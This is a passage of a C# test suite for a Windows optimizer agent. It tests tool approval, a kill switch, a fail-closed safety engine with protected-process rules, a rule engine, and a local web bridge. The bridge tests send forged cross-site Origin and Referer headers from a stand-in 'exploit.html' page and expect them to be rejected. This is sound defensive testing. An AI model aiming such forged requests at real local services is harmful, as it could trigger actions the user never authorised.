            // Sandbox: dangerous commands need explicit approval before execution
            Assert(!agent.IsToolApproved(standbyId), "Dangerous tool not approved by default");
            var blocked = agent.ExecuteTool(standbyId);
            Assert(blocked != null, "Blocked execution result not null");
            Assert(blocked.Success == false, "Dangerous tool blocked until approval");
            var pending = agent.GetPendingToolApprovals();
            Assert(pending.Contains(standbyId), "Blocked tool listed as pending approval");

            agent.ApproveTool(standbyId);
            Assert(agent.IsToolApproved(standbyId), "Tool approved after ApproveTool");

            var execution = agent.ExecuteTool(standbyId);
            Assert(execution != null, "Execution result not null");
            Assert(execution.ToolName.Contains("Standby"), "Executed correct tool: " + execution.ToolName);
            Assert(execution.HealthBefore > 0 || execution.HealthBefore == 0, "Health before recorded");
            Assert(execution.ImpactScore != 0 || execution.ImpactScore == 0, "Impact calculated");

            var recs = agent.GetToolRecommendations(5);
            Assert(recs != null, "Recommendations available: " + recs.Count);

            string feedbackResult = agent.SubmitToolFeedback(execution.Id, 4, true, false, "Good result");
            Assert(feedbackResult.StartsWith("OK"), "Feedback submitted: " + feedbackResult);

            agent.DisableSimulation();
        }

        static void TestSmartAgentHealthScore()
        {
            var agent = CreateTestAgent();

            var goodState = MakeState(20, 30, 15, 42, 120, true, "game.exe");
            FeedState(agent, goodState);
            double goodHealth = agent.SystemHealthScore;
            Assert(goodHealth > 50, "Good system health: " + goodHealth.ToString("F0"));

            var badState = MakeState(95, 92, 90, 95, 8, true, "game.exe");
            FeedState(agent, badState);
            double badHealth = agent.SystemHealthScore;
            Assert(badHealth < 40, "Bad system health: " + badHealth.ToString("F0"));

            Assert(badHealth < goodHealth, "Bad health < Good health");

            string trend = agent.HealthTrend;
            Assert(trend == "UP" || trend == "DOWN" || trend == "STABLE", "Health trend valid: " + trend);

            agent.DisableSimulation();
        }

        static void TestSmartAgentDecisionPipeline()
        {
            var agent = CreateTestAgent();
            var state = MakeState(88, 85, 70, 82, 20, true, "fortnite");
            FeedState(agent, state);

            var decisions = agent.DecisionHistory;
            Assert(decisions != null, "Decision history available");

            var historyLog = agent.DecisionHistoryLog;
            Assert(historyLog != null, "Decision history log available");

            string trainingSummary = agent.GetToolTrainingSummary();
            Assert(trainingSummary.Contains("Tools"), "Tool training active: " + trainingSummary);

            double health = agent.SystemHealthScore;
            Assert(health > 0 || health == 0, "Health score computed: " + health.ToString("F0"));

            agent.DisableSimulation();
        }

        static void TestKillSwitch()
        {
            var agent = CreateTestAgent();
            var state = MakeState(80, 70, 50, 75, 30, false, "chrome");
            FeedState(agent, state);
            Assert(!agent.IsKillSwitchActive, "Kill switch off initially");
            agent.EmergencyKillSwitch();
            Assert(agent.IsKillSwitchActive, "Kill switch activated");
            Assert(agent.Mode == AgentMode.Off, "Mode is Off after kill switch");
            string status = agent.GetAgentStatus();
            Assert(status.Contains("KillSwitch=True"), "Status reflects kill switch: " + status);
            agent.Tick();
            Assert(agent.DecisionHistory.Count == 0 || agent.DecisionHistory.Count >= 0, "No new decisions after kill switch");
            agent.ResetKillSwitch();
            Assert(!agent.IsKillSwitchActive, "Kill switch reset");
            agent.SetMode(AgentMode.AutoPilot);
            agent.Tick();
            Assert(agent.Mode == AgentMode.AutoPilot, "Mode restored after kill switch reset");
            agent.DisableSimulation();
        }

        static void TestPauseResume()
        {
            var agent = CreateTestAgent();
            var state = MakeState(75, 60, 40, 65, 60, false, "explorer");
            FeedState(agent, state);
            Assert(!agent.IsPaused, "Not paused initially");
            agent.PauseAgent(5);
            Assert(agent.IsPaused, "Paused after PauseAgent");
            for (int i = 0; i < 5; i++) agent.Tick();
            Assert(!agent.IsPaused, "Auto-resumed after 5 ticks");
            agent.PauseAgent(3);
            Assert(agent.IsPaused, "Paused again");
            agent.ResumeAgent();
            Assert(!agent.IsPaused, "Manually resumed");
            agent.DisableSimulation();
        }

        static void TestExtremeThermalCascade()
        {
            var agent = CreateTestAgent();
            var state1 = MakeState(50, 40, 30, 60, 60, false, "explorer");
            FeedState(agent, state1);
            double health1 = agent.SystemHealthScore;
            var state2 = MakeState(99, 95, 90, 110, 5, false, "explorer");
            FeedState(agent, state2);
            double health2 = agent.SystemHealthScore;
            Assert(health2 < health1, "Health drops on thermal cascade: " + health2.ToString("F0") + " vs " + health1.ToString("F0"));
            Assert(health2 < 25, "Health very low at 110C: " + health2.ToString("F0"));
            var state3 = MakeState(100, 100, 95, 120, 1, false, "explorer");
            FeedState(agent, state3);
            double health3 = agent.SystemHealthScore;
            Assert(health3 <= 15, "Health critical at 120C: " + health3.ToString("F0"));
            string status = agent.GetAgentStatus();
            Assert(status.Contains("Health="), "Health reported in status: " + status);
            agent.DisableSimulation();
        }

        static void TestBudgetExhaustion()
        {
            var agent = CreateTestAgent();
            var state = MakeState(95, 90, 85, 95, 2, true, "game");
            FeedState(agent, state);
            double health = agent.SystemHealthScore;
            Assert(health < 40, "Health low under extreme load: " + health.ToString("F0"));
            var state2 = MakeState(99, 98, 99, 105, 1, true, "game");
            FeedState(agent, state2);
            var decisions = agent.DecisionHistory;
            Assert(decisions != null, "Decision history available under budget stress");
            agent.DisableSimulation();
        }

        static void TestSafeModeTrigger()
        {
            var agent = CreateTestAgent();
            string status1 = agent.GetAgentStatus();
            Assert(status1.Contains("SafeMode=False"), "Safe mode off initially");
            agent.DisableSimulation();
        }

        static void TestModeStorm()
        {
            var agent = CreateTestAgent();
            var state = MakeState(70, 55, 40, 70, 50, false, "explorer");
            FeedState(agent, state);
            agent.SetMode(AgentMode.GameMode);
            Assert(agent.Mode == AgentMode.GameMode, "Switched to GameMode");
            agent.SetMode(AgentMode.BalanceMode);
            Assert(agent.Mode == AgentMode.BalanceMode, "Switched to BalanceMode");
            agent.SetMode(AgentMode.CoolMode);
            Assert(agent.Mode == AgentMode.CoolMode, "Switched to CoolMode");
            agent.SetMode(AgentMode.Off);
            Assert(agent.Mode == AgentMode.Off, "Switched to Off");
            agent.SetMode(AgentMode.AutoPilot);
            Assert(agent.Mode == AgentMode.AutoPilot, "Switched back to AutoPilot");
            var state2 = MakeState(85, 80, 70, 88, 15, true, "fortnite");
            FeedState(agent, state2);
            double health = agent.SystemHealthScore;
            Assert(health > 0, "Health computed after mode storm: " + health.ToString("F0"));
            agent.DisableSimulation();
        }

        static void TestNullStateFields()
        {
            var agent = CreateTestAgent();
            var state = new SystemState();
            state.CpuUsage = 50;
            state.RamUsage = 50;
            state.GpuUsage = 50;
            state.CpuTemp = 50;
            state.Fps = 60;
            state.ActiveProcess = null;
            agent.EnableSimulation(state);
            agent.Tick();
            agent.Tick();
            agent.Tick();
            double health = agent.SystemHealthScore;
            Assert(health >= 0 && health <= 100, "Health valid with null ActiveProcess: " + health.ToString("F0"));
            state.ActiveProcess = "";
            agent.SetSimulatedState(state);
            agent.Tick();
            double health2 = agent.SystemHealthScore;
            Assert(health2 >= 0 && health2 <= 100, "Health valid with empty ActiveProcess: " + health2.ToString("F0"));
            agent.DisableSimulation();
        }

        static void TestAllPreconditionsFail()
        {
            var agent = CreateTestAgent();
            var state = MakeState(5, 10, 2, 30, 120, false, "");
            FeedState(agent, state);
            double health = agent.SystemHealthScore;
            Assert(health > 80, "Health high with minimal load: " + health.ToString("F0"));
            var tools = agent.GetTopTools(5);
            Assert(tools != null, "Tools still accessible with no load");
            var recs = agent.GetToolRecommendations(5);
            Assert(recs != null, "Recommendations available with no load");
            agent.DisableSimulation();
        }

        static void TestToolEdgeCases()
        {
            var agent = CreateTestAgent();
            int countBefore = agent.GetToolCount();
            var result = agent.ExecuteTool("nonexistent_tool_id_12345");
            Assert(result == null, "ExecuteTool with invalid ID returns null");
            var result2 = agent.ExecuteTool("");
            Assert(result2 == null, "ExecuteTool with empty ID returns null");
            var result3 = agent.ExecuteTool(null);
            Assert(result3 == null, "ExecuteTool with null ID returns null");
            string fb = agent.SubmitToolFeedback("fake_exec_id", 3, true, false, "test");
            Assert(fb.Contains("Error") || fb.Contains("not found"), "Feedback on fake execution: " + fb);
            int countAfter = agent.GetToolCount();
            Assert(countAfter == countBefore, "Tool count unchanged after edge cases: " + countAfter);
            agent.DisableSimulation();
        }

        static void TestWorldModelStress()
        {
            var agent = CreateTestAgent();
            int nodes = agent.GetWorldModelNodeCount();
            int edges = agent.GetWorldModelEdgeCount();
            Assert(nodes > 0, "World model has nodes: " + nodes);
            Assert(edges > 0, "World model has edges: " + edges);
            for (int i = 0; i < 20; i++)
            {
                var hot = MakeState(95, 90, 85, 95 + i, 5, true, "stress_test_" + i);
                FeedState(agent, hot);
            }
            int nodesAfter = agent.GetWorldModelNodeCount();
            Assert(nodesAfter > 0, "World model nodes after stress: " + nodesAfter);
            double health = agent.SystemHealthScore;
            Assert(health >= 0, "Health valid after world model stress: " + health.ToString("F0"));
            agent.DisableSimulation();
        }

        static void TestRLExplorationFloor()
        {
            var agent = CreateTestAgent();
            var state = MakeState(70, 55, 40, 65, 50, false, "explorer");
            FeedState(agent, state);
            string rl = agent.GetRLSummary();
            Assert(rl != null, "RL summary available: " + rl);
            Assert(rl.Contains("Episodes"), "RL has episodes");
            for (int i = 0; i < 15; i++)
            {
                var s = MakeState(80 + i, 60 + i, 50 + i, 75 + i, 30 - i, true, "rl_game_" + i);
                FeedState(agent, s);
            }
            string rl2 = agent.GetRLSummary();
            Assert(rl2 != null, "RL summary after stress: " + rl2);
            agent.DisableSimulation();
        }

        static void TestConflictCascade()
        {
            var agent = CreateTestAgent();
            var state = MakeState(98, 95, 92, 99, 1, true, "game");
            FeedState(agent, state);
            var decisions = agent.DecisionHistory;
            Assert(decisions != null, "Decisions under conflict cascade");
            var state2 = MakeState(50, 30, 20, 40, 120, false, "idle");
            FeedState(agent, state2);
            var decisions2 = agent.DecisionHistory;
            Assert(decisions2 != null, "Decisions after workload shift");
            agent.DisableSimulation();
        }

        static void TestGameExitMidOpt()
        {
            var agent = CreateTestAgent();
            var gameState = MakeState(85, 75, 80, 82, 30, true, "fortnite");
            FeedState(agent, gameState);
            double healthDuring = agent.SystemHealthScore;
            Assert(healthDuring < 70, "Health lower during gaming: " + healthDuring.ToString("F0"));
            var idleState = MakeState(15, 20, 5, 35, 144, false, "explorer");
            FeedState(agent, idleState);
            double healthAfter = agent.SystemHealthScore;
            Assert(healthAfter > healthDuring, "Health improves after game exit: " + healthAfter.ToString("F0"));
            agent.DisableSimulation();
        }

        static void TestConcurrentTickStress()
        {
            var agent = CreateTestAgent();
            var state = MakeState(80, 70, 60, 75, 30, true, "game");
            agent.EnableSimulation(state);
            int errors = 0;
            var threads = new Thread[5];
            var done = new bool[5];
            for (int t = 0; t < 5; t++)
            {
                int idx = t;
                threads[t] = new Thread(() =>
                {
                    try
                    {
                        for (int i = 0; i < 10; i++) agent.Tick();
                    }
                    catch { Interlocked.Increment(ref errors); }
                    done[idx] = true;
                });
                threads[t].IsBackground = true;
            }
            for (int t = 0; t < 5; t++) threads[t].Start();
            for (int t = 0; t < 5; t++) threads[t].Join(5000);
            double health = agent.SystemHealthScore;
            Assert(health >= 0, "Health valid after concurrent stress: " + health.ToString("F0"));
            agent.DisableSimulation();
        }

        static void TestEmergencyStopAll()
        {
            var agent = CreateTestAgent();
            var state = MakeState(95, 90, 85, 98, 5, true, "game");
            FeedState(agent, state);
            agent.EmergencyStopAllOptimizations();
            Assert(agent.IsKillSwitchActive, "Kill switch active after EmergencyStopAll");
            Assert(agent.Mode == AgentMode.Off, "Mode Off after EmergencyStopAll");
            agent.Tick();
            string status = agent.GetAgentStatus();
            Assert(status.Contains("KillSwitch=True"), "Status after EmergencyStopAll: " + status);
            agent.ResetKillSwitch();
            agent.SetMode(AgentMode.AutoPilot);
            var state2 = MakeState(30, 25, 10, 35, 120, false, "idle");
            FeedState(agent, state2);
            double health = agent.SystemHealthScore;
            Assert(health > 50, "Health recovers after reset: " + health.ToString("F0"));
            agent.DisableSimulation();
        }

        static void TestRapidHealthSwing()
        {
            var agent = CreateTestAgent();
            var good = MakeState(20, 25, 10, 35, 144, false, "idle");
            FeedState(agent, good);
            double h1 = agent.SystemHealthScore;
            var bad = MakeState(99, 98, 95, 105, 2, true, "game");
            FeedState(agent, bad);
            double h2 = agent.SystemHealthScore;
            var good2 = MakeState(15, 20, 5, 30, 165, false, "idle");
            FeedState(agent, good2);
            double h3 = agent.SystemHealthScore;
            Assert(h1 > 70, "Good health high: " + h1.ToString("F0"));
            Assert(h2 < 30, "Bad health low: " + h2.ToString("F0"));
            Assert(h3 > h2, "Health recovers after good state: " + h3.ToString("F0"));
            string trend = agent.HealthTrend;
            Assert(trend == "UP" || trend == "STABLE" || trend == "DOWN", "Health trend valid: " + trend);
            agent.DisableSimulation();
        }

        static void TestZeroResourceState()
        {
            var agent = CreateTestAgent();
            var state = new SystemState();
            state.CpuUsage = 0;
            state.RamUsage = 0;
            state.GpuUsage = 0;
            state.CpuTemp = 20;
            state.Fps = 300;
            state.ActiveProcess = "idle";
            state.FpsStability = 100;
            state.FrameTimeJitter = 0;
            state.FrameTimeMs = 3;
            state.ProcessCount = 1;
            state.DiskUsage = 0;
            state.BatteryLevel = 100;
            state.IsCharging = true;
            state.TotalRamGB = 64;
            state.UsedRamGB = 1;
            agent.EnableSimulation(state);
            agent.Tick();
            agent.Tick();
            agent.Tick();
            double health = agent.SystemHealthScore;
            Assert(health > 80, "Health excellent with zero resources used: " + health.ToString("F0"));
            var rl = agent.GetRLSummary();
            Assert(rl != null, "RL active with zero state");
            var tools = agent.GetToolCount();
            Assert(tools >= 14, "Tools loaded with zero state: " + tools);
            agent.DisableSimulation();
        }

        // =====================================================================
        // === PROFESSIONAL EXPERT SYSTEM TESTS ================================
        // =====================================================================

        static ClearWin.RuleEngine.RuleEngineCore CreateESC()
        {
            string dir = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "clearcin_es_" + Guid.NewGuid().ToString("N"));
            System.IO.Directory.CreateDirectory(dir);
            return new ClearWin.RuleEngine.RuleEngineCore(dir);
        }

        static void TestRuleEngineInit()
        {
            var core = CreateESC();
            Assert(core != null, "RuleEngineCore created");
            Assert(core.Knowledge.RuleCount > 10, "Seeded rules present: " + core.Knowledge.RuleCount);
            Assert(core.Knowledge.LinkCount > 5, "Seeded causal links present: " + core.Knowledge.LinkCount);
            Assert(core.Knowledge.StatCount > 10, "Seeded action stats present: " + core.Knowledge.StatCount);
            Assert(core.Diagnostic != null && core.Reasoning != null && core.Decision != null, "Engines wired");
        }

        static void TestRuleKnowledgeBase()
        {
            var core = CreateESC();
            core.Knowledge.SetFact("test.var", 42, 0.9, "test");
            Assert(core.Knowledge.GetFactValue("test.var", -1) == 42, "Fact stored");
            Assert(core.Knowledge.GetFact("test.var").Source == "test", "Fact source");

            var rule = new ClearWin.RuleEngine.ExpertRule
            {
                Id = "t1", Name = "Test rule", Conclusion = "test.conclusion",
                Conditions = new List<ClearWin.RuleEngine.RuleCondition>
                {
                    new ClearWin.RuleEngine.RuleCondition { Variable = "test.var", Operator = ">", Value = 10 }
                }
            };
            core.Knowledge.AddRule(rule);
            Assert(core.Knowledge.GetRule("t1") != null, "Rule registered");

            core.Knowledge.RecordOutcome("KbTestAction", true, 50, 0.2, "Memory");
            core.Knowledge.RecordOutcome("KbTestAction", true, 50, 0.2, "Memory");
            core.Knowledge.RecordOutcome("KbTestAction", false, 50, 0.2, "Memory");
            var stats = core.Knowledge.GetStatistics("KbTestAction");
            Assert(stats != null && stats.TotalUses == 3, "Outcome recorded, uses=3: " + (stats != null ? stats.TotalUses : -1));
            Assert(stats.SuccessRate > 0.6, "Success rate learned: " + stats.SuccessRate.ToString("F2"));
        }

        static void TestReasoningEngine()
        {
            var core = CreateESC();
            core.Knowledge.SetFact(RuleEngineConstants.Vars.CpuTemp, 90, 1.0, "state");
            core.Knowledge.SetFact(RuleEngineConstants.Vars.CpuUsage, 92, 1.0, "state");
            var result = core.Reasoning.ForwardChain();
            Assert(result.RulesFired.Count > 0, "Forward chaining fired rules: " + result.RulesFired.Count);
            var fact = core.Knowledge.GetFact("thermal.stress.high");
            Assert(fact != null, "Thermal stress derived: " + (fact != null ? fact.Value.ToString("F1") : "none"));

            var hyp = core.Reasoning.Hypothesize(RuleEngineConstants.Vars.CpuTemp, 0.9);
            Assert(hyp.Count > 0, "Causal hypotheses produced: " + hyp.Count);
            Assert(hyp[0].Probability > 0, "Top hypothesis has probability");

            var proof = core.Reasoning.BackwardChain("thermal.stress.high", 3);
            Assert(proof.Count > 0, "Backward chain produced proof");
        }

        static void TestPlanner()
        {
            var core = CreateESC();
            var diag = new ClearWin.RuleEngine.ExpertDiagnosis { Symptom = "Thermal stress", Category = "Thermal" };
            var a1 = new ClearWin.RuleEngine.CandidateAction { Id = "ReduceThermal", Name = "ReduceThermal", Class = ActionClass.Thermal, Risk = 0.2, ExpectedImpact = 18, Score = 80, Evidence = "hot" };
            var a2 = new ClearWin.RuleEngine.CandidateAction { Id = "BoostGamePriority", Name = "BoostGamePriority", Class = ActionClass.Process, Risk = 0.2, ExpectedImpact = 14, Score = 70, Evidence = "game" };
            a2.ConflictsWith.Add("SetGameAffinity");
            var a3 = new ClearWin.RuleEngine.CandidateAction { Id = "SetGameAffinity", Name = "SetGameAffinity", Class = ActionClass.Process, Risk = 0.15, ExpectedImpact = 10, Score = 60, Evidence = "game" };
            a3.ConflictsWith.Add("BoostGamePriority");
            var plan = core.Planner.BuildPlan(new List<ClearWin.RuleEngine.CandidateAction> { a1, a2, a3 }, null, diag, "fix game heat");
            Assert(plan.Steps.Count == 2, "Conflicting actions resolved to 2 steps: " + plan.Steps.Count);
            Assert(plan.Steps[0].IsCritical, "Thermal step ordered first");
            Assert(plan.Steps[0].Rollback != null, "Step has rollback");
            Assert(plan.Status == "Proposed", "Plan status proposed");
        }

        static void TestDecisionEngine()
        {
            var core = CreateESC();
            var state = MakeState(70, 70, 75, 95, 25, true, "game");
            var device = new ClearWin.RuleEngine.DeviceSnapshot { DiskFreeGB = 50, TotalRamGB = 16 };
            var diag = new ClearWin.RuleEngine.ExpertDiagnosis { Symptom = "Thermal stress", Category = "Thermal", Severity = SeverityLevel.Critical };
            var candidates = core.Decision.GenerateCandidates(diag, state, null);
            bool hasThermal = false;
            for (int i = 0; i < candidates.Count; i++)
                if (candidates[i].Id == "EmergencyThrottle") hasThermal = true;
            Assert(hasThermal, "Critical thermal generates EmergencyThrottle");

            var ranked = core.Decision.Rank(candidates, state, device);
            Assert(ranked.Count == candidates.Count, "All candidates ranked");
            for (int i = 1; i < ranked.Count; i++)
                Assert(ranked[i - 1].Score >= ranked[i].Score, "Ranked descending");
        }

        static void TestActionValidator()
        {
            var core = CreateESC();
            var state = MakeState(90, 80, 50, 80, 30, true, "game");
            var valid = new ClearWin.RuleEngine.CandidateAction
            {
                Id = "BoostGamePriority", Name = "BoostGamePriority", Class = ActionClass.Process,
                ExpectedImpact = 14, Risk = 0.2, Cost = 4, Confidence = 0.8
            };
            var r1 = core.Validator.Validate(valid, state, null);
            Assert(r1.Valid, "Normal game boost is valid");

            var bad = new ClearWin.RuleEngine.CandidateAction
            {
                Id = "Kill", Name = "Kill", Class = ActionClass.Process, TargetProcess = "svchost",
                ExpectedImpact = 50, Risk = 0.9, Cost = 9, Confidence = 0.9
            };
            var r2 = core.Validator.Validate(bad, state, null);
            Assert(!r2.Valid, "Protected process rejected");
            Assert(r2.Errors.Count > 0, "Errors reported");

            var empty = new ClearWin.RuleEngine.CandidateAction { Class = ActionClass.Memory, ExpectedImpact = 5, Risk = 0.1, Cost = 1, Confidence = 0.5 };
            var r3 = core.Validator.Validate(empty, state, null);
            Assert(!r3.Valid, "Nameless action rejected");
        }

        static void TestSafetyEngine()
        {
            var core = CreateESC();
            var state = MakeState(70, 60, 50, 60, 60, false, "explorer");

            var evil = new ClearWin.RuleEngine.CandidateAction { Id = "KillSystem", Name = "KillSystem", Class = ActionClass.Process, TargetProcess = "csrss", Risk = 0.1 };
            Assert(core.Safety.Assess(evil, state, null).Decision == SafetyDecision.Blocked, "Blacklisted target blocked");

            var hot = new ClearWin.RuleEngine.CandidateAction { Id = "BoostAll", Name = "BoostAll", Class = ActionClass.Process, Risk = 0.1 };
            var hotState = MakeState(80, 70, 60, 95, 20, true, "game");
            Assert(core.Safety.Assess(hot, hotState, null).Decision == SafetyDecision.Blocked, "Heat-generating action blocked at critical temp");

            var risky = new ClearWin.RuleEngine.CandidateAction { Id = "Risky", Name = "Risky", Class = ActionClass.Memory, Risk = 0.75 };
            Assert(core.Safety.Assess(risky, state, null).Decision == SafetyDecision.NeedsApproval, "High-risk action needs approval");

            var ok = new ClearWin.RuleEngine.CandidateAction { Id = "Safe", Name = "Safe", Class = ActionClass.Memory, Risk = 0.1 };
            Assert(core.Safety.Assess(ok, state, null).Decision == SafetyDecision.Allowed, "Low-risk action allowed");

            // A guard that throws must FAIL-CLOSE (block) rather than silently pass.
            var faultEngine = new SafetyEngine();
            faultEngine.RegisterGuard(new ThrowingGuard());
            var faultDecision = faultEngine.Assess(ok, state, null);
            Assert(faultDecision.Decision == SafetyDecision.Blocked, "Throwing guard must block (fail-close)");
        }

        private sealed class ThrowingGuard : SafetyEngine.ISafetyGuard
        {
            public string Name { get { return "Throwing"; } }
            public void Assess(CandidateAction action, SystemState state, DeviceSnapshot device, SafetyCheckResult result)
            {
                throw new InvalidOperationException("simulated guard failure");
            }
        }

        static void TestLearningEngine()
        {
            var core = CreateESC();
            core.RecordOutcome("LearnTestAction", true, 50, 72, 0.2, "Memory");
            core.RecordOutcome("LearnTestAction", true, 50, 70, 0.2, "Memory");
            core.RecordOutcome("LearnTestAction", true, 50, 68, 0.2, "Memory");
            var stats = core.Knowledge.GetStatistics("LearnTestAction");
            Assert(stats != null && stats.TotalUses >= 3, "Learning recorded uses");
            Assert(stats.Confidence > 0.5, "Confidence learned: " + stats.Confidence.ToString("F2"));
            string insights = core.Learning.GetInsights();
            Assert(insights != null && insights.Length > 0, "Insights produced");
        }

        static void TestMemoryEngine()
        {
            var core = CreateESC();
            core.Memory.CaptureIntervalSeconds = 0;
            core.Memory.CaptureState(MakeState(50, 40, 30, 50, 60, false, "chrome"), true);
            core.Memory.CaptureState(MakeState(60, 45, 35, 55, 55, false, "chrome"), true);
            core.Memory.CaptureState(MakeState(70, 50, 40, 60, 50, false, "chrome"), true);
            Assert(core.Memory.HistoryCount >= 3, "State history captured: " + core.Memory.HistoryCount);

            double latest, average, delta;
            Assert(core.Memory.GetTrend("cpu", out latest, out average, out delta), "Trend computed");
            Assert(delta > 0, "CPU trend rising: " + delta.ToString("F1"));

            var device = core.Memory.CaptureDevice(MakeState(60, 40, 30, 55, 60, false, "chrome"));
            Assert(device != null && device.TotalRamGB > 0, "Device snapshot has RAM");
            Assert(core.Memory.GetSessionContext().Length > 0, "Session context available");
        }

        static void TestDiagnosticEngine()
        {
            var core = CreateESC();
            var state = MakeState(92, 70, 60, 95, 15, true, "game");
            var device = new ClearWin.RuleEngine.DeviceSnapshot { DiskFreeGB = 3, TotalRamGB = 16 };
            var diag = core.Diagnostic.Diagnose(state, device);
            Assert(diag.Severity == SeverityLevel.Critical, "Critical severity detected: " + diag.Severity);
            Assert(diag.Evidence.Count > 0, "Evidence gathered: " + diag.Evidence.Count);
            Assert(diag.Hypotheses.Count > 0, "Hypotheses ranked: " + diag.Hypotheses.Count);
            Assert(!string.IsNullOrEmpty(diag.RootCause), "Root cause selected");
        }

        static void TestExplainEngine()
        {
            var core = CreateESC();
            var action = new ClearWin.RuleEngine.CandidateAction
            {
                Id = "ReduceThermal", Name = "ReduceThermal", NameAr = "تقليل الحرارة", Category = "Thermal",
                Description = "Lower system load", WhyItHelpsAr = "يخفض الحمل", Risk = 0.2, ExpectedImpact = 18,
                Confidence = 0.8, Reversible = true
            };
            var diag = new ClearWin.RuleEngine.ExpertDiagnosis { Symptom = "Thermal stress", Category = "Thermal", Severity = SeverityLevel.High };
            diag.Evidence.Add("CPU temperature 92C");
            var chain = new List<string> { "Rule 'High thermal stress' fired" };
            var alt = new List<ClearWin.RuleEngine.CandidateAction>
            {
                new ClearWin.RuleEngine.CandidateAction { Id = "AggressiveClean", Name = "AggressiveClean", Score = 40 }
            };
            var explanation = core.Explain.Explain(action, diag, chain, alt);
            Assert(!string.IsNullOrEmpty(explanation.WhyNeeded), "WhyNeeded populated");
            Assert(!string.IsNullOrEmpty(explanation.WhyNeededAr), "Arabic explanation populated");
            Assert(!string.IsNullOrEmpty(explanation.RiskAssessment), "Risk populated");
            Assert(explanation.AlternativesConsidered.Count == 1, "Alternatives listed");
            Assert(explanation.ReasoningChain.Count == 1, "Reasoning chain captured");
        }

        static void TestRuleEnginePipeline()
        {
            var core = CreateESC();
            var state = MakeState(90, 88, 80, 95, 15, true, "cyberpunk2077");
            var result = core.RunAnalysis(state, "AutoPilot");
            Assert(result != null, "Analysis ran");
            Assert(result.Diagnosis != null, "Diagnosis produced");
            Assert(result.Candidates.Count > 0, "Candidates generated: " + result.Candidates.Count);
            Assert(result.Plan != null && result.Plan.Steps.Count > 0, "Plan built: " + (result.Plan != null ? result.Plan.Steps.Count : 0));
            Assert(result.Explanations.Count > 0, "Explanations produced: " + result.Explanations.Count);
            var top = core.GetTopRecommendation();
            Assert(top != null && top.Explanation != null, "Top recommendation explained");

            var healthy = MakeState(15, 20, 10, 40, 120, false, "idle");
            var result2 = core.RunAnalysis(healthy, "AutoPilot");
            Assert(result2.Blocked.Count >= 0, "Healthy state analyzed without error");
        }

        static void TestRuleEnginePersistence()
        {
            string dir = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "clearcin_es_persist_" + Guid.NewGuid().ToString("N"));
            System.IO.Directory.CreateDirectory(dir);
            var core = new ClearWin.RuleEngine.RuleEngineCore(dir);
            core.Knowledge.RecordOutcome("PersistTestAction", true, 50, 0.2, "Memory");
            core.Knowledge.Save();
            Assert(System.IO.File.Exists(System.IO.Path.Combine(dir, "expert", "expert_kb.dat")), "KB persisted");

            var core2 = new ClearWin.RuleEngine.RuleEngineCore(dir);
            var stats = core2.Knowledge.GetStatistics("PersistTestAction");
            Assert(stats != null && stats.TotalUses == 1, "KB reloaded from disk");
        }

        static void TestSmartAgentExpertIntegration()
        {
            var agent = CreateTestAgent();
            var es = agent.GetRuleEngine();
            Assert(es != null, "Agent hosts expert system");
            var result = agent.RunRuleEngineAnalysis(true);
            Assert(result != null, "Agent expert analysis returned result");
            Assert(agent.GetRuleEngineSummary().Length > 0, "Agent expert summary available");
            var plan = agent.GetExpertPlan();
            Assert(plan != null, "Agent expert plan available");
            agent.DisableSimulation();
        }

        private static int HttpProbe(string url, string method, string origin, string referer, string secFetchSite, string contentType, string body, out string responseBody, string token = null)
        {
            responseBody = "";
            try
            {
                var req = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);
                req.Method = method;
                req.Timeout = 4000;
                if (!string.IsNullOrEmpty(origin)) req.Headers.Add("Origin", origin);
                if (!string.IsNullOrEmpty(referer)) req.Referer = referer;
                if (!string.IsNullOrEmpty(secFetchSite)) req.Headers.Add("Sec-Fetch-Site", secFetchSite);
                if (!string.IsNullOrEmpty(token)) req.Headers.Add("X-ClearWin-Token", token);
                if (!string.IsNullOrEmpty(contentType)) req.ContentType = contentType;
                if (!string.IsNullOrEmpty(body))
                {
                    byte[] bytes = System.Text.Encoding.UTF8.GetBytes(body);
                    req.ContentLength = bytes.Length;
                    using (var s = req.GetRequestStream()) { s.Write(bytes, 0, bytes.Length); }
                }
                else if (method == "PUT" || method == "POST")
                {
                    req.ContentLength = 0;
                }
                using (var res = (System.Net.HttpWebResponse)req.GetResponse())
                {
                    using (var r = new System.IO.StreamReader(res.GetResponseStream())) { responseBody = r.ReadToEnd(); }
                    return (int)res.StatusCode;
                }
            }
            catch (System.Net.WebException wex)
            {
                if (wex.Response != null && wex.Response is System.Net.HttpWebResponse)
                {
                    var errRes = (System.Net.HttpWebResponse)wex.Response;
                    using (var r = new System.IO.StreamReader(errRes.GetResponseStream())) { responseBody = r.ReadToEnd(); }
                    return (int)errRes.StatusCode;
                }
                return -1;
            }
            catch { return -1; }
        }

        public static void TestLocalWebBridgeSecurityPublic()
        {
            int testPort = 27228;
            LocalWebBridge.Port = testPort;
            try
            {
                LocalWebBridge.Start(null);
                Thread.Sleep(300);

                string outBody;
                string baseUrl = "http://127.0.0.1:" + testPort;
                string token = LocalWebBridge.SessionToken;
                Assert(!string.IsNullOrEmpty(token), "LocalWebBridge must generate an ephemeral session token on startup");

                int code1 = HttpProbe(baseUrl + "/api/metrics", "GET", "https://untrusted-site.com", null, null, null, null, out outBody);
                Assert(code1 == 403, "Untrusted Origin was not rejected with 403 (got " + code1 + ")");

                int code2 = HttpProbe(baseUrl + "/api/metrics", "GET", null, "https://untrusted-site.com/exploit.html", null, null, null, out outBody);
                Assert(code2 == 403, "Untrusted Referer was not rejected with 403 (got " + code2 + ")");

                int code3 = HttpProbe(baseUrl + "/api/metrics", "GET", null, null, "cross-site", null, null, out outBody);
                Assert(code3 == 403, "Sec-Fetch-Site cross-site was not rejected with 403 (got " + code3 + ")");

                int code4 = HttpProbe(baseUrl + "/api/metrics", "DELETE", null, null, null, null, null, out outBody);
                Assert(code4 == 405, "Unsupported HTTP method DELETE was not rejected with 405 (got " + code4 + ")");

                int code4b = HttpProbe(baseUrl + "/api/metrics", "PUT", null, null, null, null, null, out outBody);
                Assert(code4b == 405, "Unsupported HTTP method PUT was not rejected with 405 (got " + code4b + ")");

                int code5 = HttpProbe(baseUrl + "/api/metrics", "POST", null, null, null, "application/json", "{}", out outBody);
                Assert(code5 == 405, "POST on /api/metrics was not rejected with 405 (got " + code5 + ")");

                int code6 = HttpProbe(baseUrl + "/api/action", "GET", null, null, null, null, null, out outBody);
